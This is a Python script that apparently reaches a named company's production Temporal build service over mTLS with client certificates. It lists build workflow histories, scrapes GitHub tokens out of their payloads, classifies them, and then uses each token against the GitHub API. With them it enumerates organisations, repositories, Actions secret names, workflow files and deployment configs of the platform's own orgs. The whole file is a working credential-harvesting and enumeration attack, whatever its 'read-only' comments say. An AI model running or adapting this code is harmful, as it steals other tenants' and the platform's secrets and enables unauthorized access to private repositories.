#!/usr/bin/env python3
# I67852 round2: extract GitHub credential fields from Temporal build workflows,
# classify platform-side vs tenant-side, read-only GitHub API probe + org/repo enumeration.
import subprocess, struct, json, sys, os, time, re, base64

G = 'https://external-mtls-service-gateway-us-west1.gcp.production.rlwy.net'
CA = '/pki/server-ca-bundle.crt'
CRT = '/pki/client.crt'
KEY = '/pki/client.key'
CTR = [0]
T = '/temporal.api.workflowservice.v1.WorkflowService/'
PLATFORM_OWNERS = ['railwayapp', 'railway', 'railwaycorp', 'railway-infra', 'railwayinc']
PLATFORM_HINTS = ['orchestrator', 'backboard', 'network-cp', 'network_cp', 'stacklet', 'builderv3',
                  'hikari', 'station', 'railyard', 'cms', 'siteops', 'railpack', 'railway']


def varint(n):
    out = bytearray()
    while True:
        b = n & 0x7f
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            return bytes(out)


def fv(f, n):
    return varint(f << 3) + varint(n)


def fb(f, b):
    return varint((f << 3) | 2) + varint(len(b)) + b


def fs(f, s):
    return fb(f, s.encode() if isinstance(s, str) else s)


def fmsg(f, m):
    return fb(f, m)


def rd_varint(b, i):
    r = 0
    s = 0
    while i < len(b):
        x = b[i]
        r |= (x & 0x7f) << s
        i += 1
        if not x & 0x80:
            return r, i
        s += 7
        if s > 63:
            break
    raise ValueError('varint')


def parse(b):
    i = 0
    out = []
    while i < len(b):
        k, i = rd_varint(b, i)
        f = k >> 3
        w = k & 7
        if f == 0:
            raise ValueError('f0')
        if w == 0:
            v, i = rd_varint(b, i)
            out.append((f, 0, v))
        elif w == 2:
            l, i = rd_varint(b, i)
            if i + l > len(b):
                raise ValueError('len')
            out.append((f, 2, b[i:i + l]))
            i += l
        elif w == 5:
            out.append((f, 5, b[i:i + 4]))
            i += 4
        elif w == 1:
            out.append((f, 1, b[i:i + 8]))
            i += 8
        else:
            raise ValueError('wt%d' % w)
    return out


def grpc_call(path, body=b'', timeout=25):
    CTR[0] += 1
    n = CTR[0]
    fu = '/tmp/r%d.bin' % n
    hu = '/tmp/h%d.txt' % n
    bu = '/tmp/b%d.bin' % n
    framed = b'\x00' + struct.pack('>I', len(body)) + body
    open(fu, 'wb').write(framed)
    args = ['curl', '-sS', '--http2', '--connect-timeout', '6', '-m', str(timeout), '-D', hu, '-o', bu,
            '-w', '%{http_code}', '--cert', CRT, '--key', KEY, '--cacert', CA, '-X', 'POST', G + path,
            '-H', 'te: trailers', '-H', 'content-type: application/grpc', '--data-binary', '@' + fu]
    subprocess.run(args, capture_output=True, text=True)
    hdr = ''
    try:
        hdr = open(hu, 'rb').read().decode('utf-8', 'replace')
    except Exception:
        pass
    sts = re.findall(r'grpc-status:\s*(\d+)', hdr)
    data = open(bu, 'rb').read() if os.path.exists(bu) else b''
    return {'http': '', 'st': (sts[-1] if sts else '-'), 'n': len(data), 'data': data}


def frame_payload(b):
    if len(b) >= 5 and b[0] == 0:
        l = struct.unpack('>I', b[1:5])[0]
        return b[5:5 + l]
    return b


def get1(b, field):
    try:
        for f, w, v in parse(b):
            if f == field and w == 2:
                return v
    except Exception:
        return None
    return None


def all_of(b, field):
    try:
        return [v for f, w, v in parse(b) if f == field and w == 2]
    except Exception:
        return []


json_re = re.compile(rb'\{"', re.S)


def jsons_from(b):
    out = []
    i = 0
    while True:
        m = json_re.search(b, i)
        if not m:
            break
        s = m.start()
        depth = 0
        j = s
        inq = False
        esc = False
        while j < len(b):
            c = b[j:j + 1]
            if inq:
                if esc:
                    esc = False
                elif c == b'\\':
                    esc = True
                elif c == b'"':
                    inq = False
            else:
                if c == b'"':
                    inq = True
                elif c == b'{':
                    depth += 1
                elif c == b'}':
                    depth -= 1
                    if depth == 0:
                        break
            j += 1
        if j < len(b) and 2 < j - s < 400000:
            try:
                out.append(json.loads(b[s:j + 1].decode('utf-8', 'replace')))
            except Exception:
                pass
        i = max(j, s + 2)
        if len(out) > 60:
            break
    return out


TOKEN_KEYS = ('githubtoken', 'bearertoken', 'githubbottoken', 'storetoken')


def walk(o, prefix='', found=None):
    found = found if found is not None else []
    if isinstance(o, dict):
        for k, v in o.items():
            lk = k.lower()
            if isinstance(v, str) and any(lk == tk or lk.endswith('.' + tk) for tk in TOKEN_KEYS):
                found.append((prefix + k, v))
            walk(v, prefix + k + '.', found)
    elif isinstance(o, list):
        for it in o[:6]:
            walk(it, prefix, found)
    return found


def classify(tok, key):
    if key.lower().endswith('storetoken'):
        try:
            d = json.loads(base64.b64decode(tok + '=' * (-len(tok) % 4)))
            return 'checkpoint_storetoken(%s)' % ','.join(list(d.keys())[:4])
        except Exception:
            return 'checkpoint_storetoken_opaque'
    if tok.startswith('ghp_'):
        return 'ghp_PAT_classic'
    if tok.startswith('gho_'):
        return 'gho_OAuth'
    if tok.startswith('ghu_'):
        return 'ghu_user_server'
    if tok.startswith('ghs_'):
        return 'ghs_app_installation'
    if tok.startswith('ghr_'):
        return 'ghr_refresh'
    if tok.startswith('github_pat_'):
        return 'github_pat_finegrained'
    if tok.startswith('eyJ'):
        return 'JWT'
    return 'opaque'


def gh(path, tok):
    args = ['curl', '-sS', '-m', '25', '-w', '\n%{http_code}', '-D', '/tmp/gh.h',
            '-H', 'Authorization: token ' + tok, '-H', 'User-Agent: i67852-probe',
            '-H', 'Accept: application/vnd.github+json', 'https://api.github.com' + path]
    p = subprocess.run(args, capture_output=True, text=True)
    body = p.stdout or ''
    code = ''
    if '\n' in body:
        body, code = body.rsplit('\n', 1)
    try:
        hdr = open('/tmp/gh.h', 'r', errors='replace').read()
    except Exception:
        hdr = ''
    return code.strip(), body, hdr


def hval(hdr, name):
    m = re.search(r'(?im)^' + name + r':\s*([^\r\n]*)', hdr)
    return m.group(1).strip() if m else ''


def summarize_repos(body, limit=30):
    try:
        d = json.loads(body)
    except Exception:
        return []
    items = d if isinstance(d, list) else (d.get('repositories') or d.get('items') or d.get('installations') or [])
    out = []
    for rp in items[:limit]:
        if isinstance(rp, dict):
            if 'full_name' in rp:
                out.append('%s:%s' % (rp.get('full_name'), 'priv' if rp.get('private') else 'pub'))
            elif 'account' in rp:
                a = rp.get('account') or {}
                out.append('inst:%s:%s:id%s' % (a.get('login'), a.get('type'), rp.get('id')))
    return out


def probe_token(idx, tok, cls, key, src):
    print('---TEST|%d|%s|key=%s---' % (idx, cls, key), flush=True)
    results = {}
    # 1) /user
    code, body, hdr = gh('/user', tok)
    try:
        d = json.loads(body)
        info = 'login=%s|type=%s|id=%s' % (d.get('login'), d.get('type'), d.get('id'))
    except Exception:
        info = body[:160].replace('\n', ' ')
    print('API|%d|user|http=%s|%s|x-oauth-scopes=[%s]|accepted=[%s]' %
          (idx, code, info, hval(hdr, 'x-oauth-scopes'), hval(hdr, 'x-accepted-oauth-scopes')), flush=True)
    results['user'] = (code, body)
    # 2) installations (user token endpoint)
    code, body, hdr = gh('/user/installations?per_page=30', tok)
    ins = summarize_repos(body, 10)
    print('API|%d|user_installations|http=%s|%s|%s' % (idx, code, body[:160].replace('\n', ' '), ','.join(ins)), flush=True)
    # 3) installation token endpoint (works with ghs_ installation tokens)
    code, body, hdr = gh('/installation/repositories?per_page=30', tok)
    irepos = summarize_repos(body, 30)
    print('API|%d|installation_repos|http=%s|n=%d|%s' % (idx, code, len(irepos), ','.join(irepos)), flush=True)
    if code == '200' and irepos:
        results['inst_repos'] = json.loads(body)
    # 4) memberships (classic PAT / OAuth)
    code, body, hdr = gh('/user/memberships/orgs?per_page=30', tok)
    try:
        d = json.loads(body)
        mem = ['%s:%s' % (m.get('organization', {}).get('login'), m.get('role')) for m in (d if isinstance(d, list) else [])]
    except Exception:
        mem = []
    print('API|%d|memberships|http=%s|%s|%s' % (idx, code, body[:120].replace('\n', ' '), ','.join(mem[:15])), flush=True)
    # 5) known public repo probe (railpack) - metadata only
    code, body, hdr = gh('/repos/railwayapp/railpack', tok)
    try:
        d = json.loads(body)
        print('API|%d|repos/railwayapp/railpack|http=%s|full_name=%s|private=%s|perm=%s' %
              (idx, code, d.get('full_name'), d.get('private'), json.dumps(d.get('permissions') or {})[:120]), flush=True)
    except Exception:
        print('API|%d|repos/railwayapp/railpack|http=%s|%s' % (idx, code, body[:120].replace('\n', ' ')), flush=True)
    # 6) org repos for platform owners
    for org in PLATFORM_OWNERS:
        code, body, hdr = gh('/orgs/%s/repos?per_page=30&type=all' % org, tok)
        rr = summarize_repos(body, 30)
        print('API|%d|org_repos[%s]|http=%s|n=%d|%s' % (idx, org, code, len(rr), ','.join(rr)[:900]), flush=True)
        if code == '200' and rr:
            results.setdefault('org_repos', {})[org] = rr
        # secrets names only (read-only metadata, no values)
        code2, body2, hdr2 = gh('/orgs/%s/actions/secrets?per_page=30' % org, tok)
        names = []
        try:
            d = json.loads(body2)
            names = [s.get('name') for s in (d.get('secrets') or [])]
        except Exception:
            pass
        print('API|%d|org_secret_names[%s]|http=%s|%s' % (idx, org, code2, ','.join(names[:20])), flush=True)
    # 7) search for repos owned by the identity and by platform orgs
    for q in ['user:railway-railpack', 'org:railwayapp', 'org:railwaycorp', 'org:railway-infra',
              'railway in:name org:railwayapp']:
        code, body, hdr = gh('/search/repositories?per_page=20&q=' + q.replace(' ', '+'), tok)
        rr = summarize_repos(body, 20)
        print('API|%d|search[%s]|http=%s|n=%d|%s' % (idx, q, code, len(rr), ','.join(rr)[:700]), flush=True)
    return results


def drill_repo(idx, tok, full):
    print('---DRILL|%d|%s---' % (idx, full), flush=True)
    for fn in ['railway.toml', 'railway.json', 'docker-compose.yml', 'Dockerfile']:
        code, body, hdr = gh('/repos/%s/contents/%s' % (full, fn), tok)
        if code == '200':
            try:
                d = json.loads(body)
                content = base64.b64decode(d.get('content', '')).decode('utf-8', 'replace')
            except Exception:
                content = body[:300]
            print('FILE|%d|%s/%s|len=%d|%s' % (idx, full, fn, len(content), content[:900].replace('\n', '\\n')), flush=True)
    code, body, hdr = gh('/repos/%s/contents/.github/workflows' % full, tok)
    try:
        d = json.loads(body)
        print('WF|%d|%s|http=%s|%s' % (idx, full, code, ','.join(x.get('name', '') for x in (d if isinstance(d, list) else []))), flush=True)
    except Exception:
        print('WF|%d|%s|http=%s|%s' % (idx, full, code, body[:100].replace('\n', ' ')), flush=True)
    code, body, hdr = gh('/repos/%s/actions/secrets?per_page=30' % full, tok)
    try:
        d = json.loads(body)
        print('REPOSEC|%d|%s|http=%s|%s' % (idx, full, code, ','.join(s.get('name') for s in (d.get('secrets') or [])[:20])), flush=True)
    except Exception:
        print('REPOSEC|%d|%s|http=%s|%s' % (idx, full, code, body[:100].replace('\n', ' ')), flush=True)


def main():
    print('===I67852R2 START=== host=%s %s' % (subprocess.run(['hostname'], capture_output=True, text=True).stdout.strip(),
                                              time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())), flush=True)
    r = grpc_call(T + 'GetSystemInfo', b'')
    print('CTRL|GetSystemInfo|st=%s|len=%d' % (r['st'], r['n']), flush=True)
    if r['st'] != '0':
        print('ABORT|unreachable', flush=True)
        return
    execs = []
    for q in ['WorkflowType="ScheduleBuildAndPublishImage"', 'WorkflowType="ScheduleSnapshotAndBuild"']:
        req = fs(1, 'builds') + fv(2, 20) + fs(4, q)
        r = grpc_call(T + 'ListWorkflowExecutions', req)
        if r['st'] != '0':
            print('LIST|fail|%s' % r['st'], flush=True)
            continue
        pl = frame_payload(r['data'])
        for ei in all_of(pl, 1):
            ex = get1(ei, 1) or b''
            wid = (get1(ex, 1) or b'').decode('utf-8', 'replace')
            rid = (get1(ex, 2) or b'').decode('utf-8', 'replace')
            ty = (get1(get1(ei, 2) or b'', 1) or b'').decode('utf-8', 'replace')
            if wid:
                execs.append((wid, rid, ty))
    seen = set()
    uniq = []
    for e in execs:
        if e[1] not in seen:
            seen.add(e[1])
            uniq.append(e)
    picks = [e for e in uniq if 'BuildAndPublish' in e[2]][:3] + [e for e in uniq if 'SnapshotAndBuild' in e[2]][:2]
    print('PICK=%d' % len(picks), flush=True)
    found = []
    for wid, rid, ty in picks:
        tok = b''
        for pg in range(2):
            req = fs(1, 'builds') + fmsg(2, fs(1, wid) + (fs(2, rid) if rid else b'')) + fv(3, 20) + (fmsg(4, tok) if tok else b'')
            r = grpc_call(T + 'GetWorkflowExecutionHistory', req, timeout=30)
            if r['st'] != '0':
                break
            pl = frame_payload(r['data'])
            tok = get1(pl, 3) or b''
            for j in jsons_from(pl):
                for k, v in walk(j):
                    found.append(('%s/%s' % (ty[:28], wid[-8:]), k, v))
            if not tok:
                break
    uni = {}
    for src, k, v in found:
        v = v.strip()
        if v and len(v) >= 8 and v not in uni:
            uni[v] = (src, k)
    print('TOKENS_UNIQUE=%d' % len(uni), flush=True)
    idx = 0
    toks = []
    for v, (src, k) in uni.items():
        idx += 1
        cls = classify(v, k)
        print('TOK|%d|key=%s|src=%s|len=%d|class=%s' % (idx, k, src, len(v), cls), flush=True)
        toks.append((idx, v, cls, k, src))
    for idx, v, cls, k, src in toks:
        if cls.startswith('checkpoint'):
            print('SKIP|%d|%s' % (idx, cls), flush=True)
            continue
        try:
            res = probe_token(idx, v, cls, k, src)
        except Exception as e:
            print('ERR|%d|%r' % (idx, e), flush=True)
            continue
        # drill platform repos only (read-only config files, no source)
        if isinstance(res, dict) and res.get('org_repos'):
            n = 0
            for org, rr in res['org_repos'].items():
                for full in rr[:2]:
                    full = full.split(':')[0]
                    if any(full.lower().startswith(o + '/') for o in PLATFORM_OWNERS) and n < 3:
                        drill_repo(idx, v, full)
                        n += 1
        time.sleep(1)
    print('===I67852R2 END===', flush=True)


if __name__ == '__main__':
    main()
